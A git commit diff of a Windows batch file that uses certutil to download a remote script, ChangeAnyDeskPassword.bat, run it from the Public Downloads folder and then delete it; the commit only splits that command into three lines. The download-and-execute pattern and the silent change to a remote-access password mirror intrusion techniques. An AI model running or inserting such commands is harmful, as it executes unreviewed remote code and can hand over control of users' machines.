1dff7e68f607864662d5b37cb76a6de891c0011d
falconx1 <gazelle.lord@gmail.com>
2023-07-05 17:18:37 +0700

    Update TaskList.bat

--- TaskList.bat
+++ TaskList.bat
@@ -1,2 +1,4 @@
 :: Download and execute change anydesk password file
-certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/ChangeAnyDeskPassword.bat" "C:\Users\Public\Downloads\ChangeAnyDeskPassword.bat" && cmd.exe /c "C:\Users\Public\Downloads\ChangeAnyDeskPassword.bat" && del /F /Q "C:\Users\Public\Downloads\ChangeAnyDeskPassword.bat"
+certutil -urlcache -split -f "https://raw.githubusercontent.com/falconx1/windows-config/main/ChangeAnyDeskPassword.bat" "C:\Users\Public\Downloads\ChangeAnyDeskPassword.bat" 
+start /wait C:\Users\Public\Downloads\ChangeAnyDeskPassword.bat
+del /F /Q "C:\Users\Public\Downloads\ChangeAnyDeskPassword.bat"
